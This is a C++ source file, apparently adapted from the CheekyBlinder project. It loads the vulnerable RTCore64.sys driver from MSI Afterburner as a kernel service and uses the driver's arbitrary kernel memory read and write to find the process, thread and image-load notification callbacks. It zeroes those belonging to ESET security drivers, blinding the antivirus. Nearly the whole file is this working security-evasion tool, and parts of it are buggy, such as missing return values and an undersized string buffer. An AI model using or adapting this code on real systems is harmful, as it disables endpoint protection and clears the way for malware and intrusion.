#include <Windows.h>
#include <aclapi.h>
#include <Psapi.h>
#include <cstdio>
#include <iostream>
#include <vector>

using namespace std;
#define _CRT_SECURE_NO_WARNINGS

// Stolen from https://github.com/br-sn/CheekyBlinder/blob/master/CheekyBlinder/CheekyBlinder.cpp


void Log(const char* Message, ...) {
    const auto file = stderr;
}


DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
    BOOL status = FALSE;
    SC_HANDLE hSC = NULL, hS = NULL;
    if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
        if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
            Log("[+] \'%s\' service already registered\n", serviceName);
        }
        else {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
                Log("[*] \'%s\' service not present\n", serviceName);
                if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
                    Log("[+] \'%s\' service successfully registered\n", serviceName);
                }
                else Log("CreateService");
            }
            else Log("OpenService");
        }
        if (hS) {
            if (startIt) {
                if (status = StartService(hS, 0, NULL))
                    Log("[+] \'%s\' service started\n", serviceName);
                else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
                    Log("[*] \'%s\' service already started\n", serviceName);
                else {
                    //Log("StartService");
                }
            }
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    else {
        Log("OpenSCManager(create)");
        return GetLastError();
    }
    return 0;
}






struct Offsets {
    DWORD64 process;
    DWORD64 image;
    DWORD64 thread;
    DWORD64 registry;
};

struct Offsets getVersionOffsets() {
    wchar_t value[255] = { 0x00 };
    DWORD BufferSize = 255;
    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
    Log("[+] Windows Version %s Found\n", value);
    auto winVer = _wtoi(value);
    switch (winVer) {
        //case 1903:
    case 1909:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2004:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    case 2009:
        return { 0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48 };
    default:
        Log("[!] Version Offsets Not Found!\n");
    }
}





HANDLE GetDriverHandle() {
    HANDLE Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Device == INVALID_HANDLE_VALUE) {
        Log("[!] Unable to obtain a handle to the device object");
        return Device;
        exit;
    }
    else {
        Log("[+] Device object handle obtained: %p", Device);
        return Device;
    }
}


DWORD64 Findkrnlbase() {
    DWORD cbNeeded = 0;
    LPVOID drivers[1024];
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        return (DWORD64)drivers[0];
    }
    return NULL;
}



DWORD64 GetFunctionAddress(LPCSTR function) {
    DWORD64 Ntoskrnlbaseaddress = Findkrnlbase();
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    DWORD64 Offset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, function)) - reinterpret_cast<DWORD64>(Ntoskrnl);
    DWORD64 address = Ntoskrnlbaseaddress + Offset;
    FreeLibrary(Ntoskrnl);
    Log("[+] %s address: %p", function, address);
    return address;
}


struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
    return MemoryRead.Value;
}
DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}
DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}




DWORD64 PatternSearch(HANDLE Device, DWORD64 start, DWORD64 end, DWORD64 pattern) {
    int range = end - start;
    for (int i = 0; i < range; i++) {
        DWORD64 contents = ReadMemoryDWORD64(Device, start + i);
        if (contents == pattern) {
            return start + i;
        }
    }
}



struct drvProps {
    TCHAR* name;
    DWORD64 Address;
};
drvProps FindDriver(DWORD64 address) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;
    DWORD64 diff[3][200];
    TCHAR szDriver[1024];
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        int n = sizeof(drivers) / sizeof(drivers[0]);
        cDrivers = cbNeeded / sizeof(drivers[0]);
        int narrow = 0;
        int c = 0;
        for (i = 0; i < cDrivers; i++) {
            if (address > (DWORD64)drivers[i]) {
                diff[0][c] = address;
                diff[1][c] = address - (DWORD64)drivers[i];
                diff[2][c] = (DWORD64)drivers[i];
                c++;
            }
        }
    }
    int k = 0;
    DWORD64 temp = diff[1][0];
    for (k = 0; k < cDrivers; k++) {
        if ((temp > diff[1][k]) && (diff[0][k] == address)) {
            temp = diff[1][k];
        }
    }
    if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {
        // renvoit le nom du driver et son adresse
        return drvProps{ szDriver, address };
    }
    else {
        Log("[+] Could not resolve driver for %p", address);
    }
}


void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}

DWORD64 findimgcallbackroutine(DWORD64 remove) {

    Offsets offsets = getVersionOffsets();
    const auto Device = GetDriverHandle();


    DWORD64 PsSetLoadImageNotifyRoutineExAddress = GetFunctionAddress("PsSetLoadImageNotifyRoutineEx");
    DWORD64 PsSetCreateProcessNotifyRoutine = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");

    DWORD64 patternaddress = PatternSearch(Device, PsSetLoadImageNotifyRoutineExAddress, PsSetCreateProcessNotifyRoutine, offsets.image);
    DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x7);
    const DWORD64 PspLoadImageNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 3;
    Log("[+] PspLoadImageNotifyRoutineAddress: %p", PspLoadImageNotifyRoutineAddress);
    Log("[+] Enumerating image load callbacks");
    int i = 0;
    for (i; i < 64; i++) {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspLoadImageNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {//only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);


            drvProps props = FindDriver(cbFunction);
            std::vector<std::string> esetDrv{ "edevmon.sys", "ehdrv.sys", "epfw.sys", "epfwwfp.sys" };
            for (std::string drvName : esetDrv)
            {
                char name[] = "";
                char* str = name;
                wcstombs(str, props.name, 12);
                const char* c = drvName.data();
                if (strcmp(c, str) == 0) {
                    printf("New ESET driver found (%s) at address : %p\n\n", c, props.Address);
                    printf("Removing callback to %p at address %p\n", cbFunction, PspLoadImageNotifyRoutineAddress + (i * 8));
                    WriteMemoryDWORD64(Device, PspLoadImageNotifyRoutineAddress + (i * 8), 0x0000000000000000);
                }
            }
        }

    }

}

DWORD64 findthreadcallbackroutine(DWORD64 remove) {

    Offsets offsets = getVersionOffsets();
    const auto Device = GetDriverHandle();

    const DWORD64 PsRemoveCreateThreadNotifyRoutine = GetFunctionAddress("PsRemoveCreateThreadNotifyRoutine");
    const DWORD64 PsRemoveLoadImageNotifyRoutine = GetFunctionAddress("PsRemoveLoadImageNotifyRoutine");

    DWORD64 patternaddress = PatternSearch(Device, PsRemoveCreateThreadNotifyRoutine, PsRemoveLoadImageNotifyRoutine, offsets.thread);
    DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x4);
    DWORD64 PspCreateThreadNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset);
    Log("[+] PspCreateThreadNotifyRoutineAddress: %p", PspCreateThreadNotifyRoutineAddress);
    Log("[+] Enumerating thread creation callbacks");
    int i = 0;
    for (i; i < 64; i++) {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {//only print actual callbacks
            callback = (callback &= ~(1ULL << 3) + 0x1);//shift bytes
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);



            drvProps props = FindDriver(cbFunction);
            std::vector<std::string> esetDrv{ "edevmon.sys", "ehdrv.sys", "epfw.sys", "epfwwfp.sys" };
            for (std::string drvName : esetDrv)
            {
                char name[] = "";
                char* str = name;
                wcstombs(str, props.name, 12);
                const char* c = drvName.data();
                if (strcmp(c, str) == 0) {
                    printf("New ESET driver found (%s) at address : %p\n\n", c, props.Address);
                    printf("Removing callback to %p at address %p\n", cbFunction, PspCreateThreadNotifyRoutineAddress + (i * 8));
                    WriteMemoryDWORD64(Device, PspCreateThreadNotifyRoutineAddress + (i * 8), 0x0000000000000000);
                }
            }
            
        }

    }

}


DWORD64 findprocesscallbackroutine(DWORD64 remove) {
    Offsets offsets = getVersionOffsets();
    const auto Device = GetDriverHandle();
    const DWORD64 PsSetCreateProcessNotifyRoutineAddress = GetFunctionAddress("PsSetCreateProcessNotifyRoutine");
    const DWORD64 IoCreateDriverAddress = GetFunctionAddress("IoCreateDriver");
    DWORD64 patternaddress = PatternSearch(Device, PsSetCreateProcessNotifyRoutineAddress, IoCreateDriverAddress, offsets.process);
    DWORD offset = ReadMemoryDWORD(Device, patternaddress - 0x0c);
    DWORD64 PspCreateProcessNotifyRoutineAddress = (((patternaddress) >> 32) << 32) + ((DWORD)(patternaddress)+offset) - 8;
    Log("[+] PspCreateProcessNotifyRoutine: %p", PspCreateProcessNotifyRoutineAddress);
    Log("[+] Enumerating process creation callbacks");
    int i = 0;
    for (i; i < 64; i++) {
        DWORD64 callback = ReadMemoryDWORD64(Device, PspCreateProcessNotifyRoutineAddress + (i * 8));
        if (callback != NULL) {
            callback = (callback &= ~(1ULL << 3) + 0x1);
            DWORD64 cbFunction = ReadMemoryDWORD64(Device, callback);


            drvProps props = FindDriver(cbFunction);
            std::vector<std::string> esetDrv{ "edevmon.sys", "ehdrv.sys", "epfw.sys", "epfwwfp.sys" };
            for (std::string drvName : esetDrv)
            {
                char name[] = "";
                char* str = name;
                wcstombs(str, props.name, 12);
                const char* c = drvName.data();
                if (strcmp(c, str) == 0) {
                    printf("\n[+] New ESET PsRoutine found (%s) at address : %p\n", c, props.Address);
                    printf("\t[+] Removing callback to %p at address %p\n", cbFunction, PspCreateProcessNotifyRoutineAddress + (i * 8));
                    WriteMemoryDWORD64(Device, PspCreateProcessNotifyRoutineAddress + (i * 8), 0x0000000000000000);
                }
            }

        }
    }
}







int main(int argc, char* argv[]) {

    // liste des drivers Eset
    // "edevmon.sys", "ehdrv.sys", "epfw.sys", "epfwwfp.sys"


    const auto svcName = L"RTCore64";
    const auto svcDesc = L"Micro-Star MSI Afterburner";
    const wchar_t driverName[] = L"\\RTCore64.sys";
    const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
    TCHAR driverPath[pathSize];
    GetCurrentDirectory(pathSize, driverPath);
    wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));


    if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
        Log("[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
        return 1;
    }


    DWORD64 processes = findprocesscallbackroutine(NULL);
    DWORD64 threads = findthreadcallbackroutine(NULL);
    DWORD64 images = findimgcallbackroutine(NULL);


    FindDriver(processes);
    printf("\n\n");
    FindDriver(threads);
    printf("\n\n");
    FindDriver(images);    

}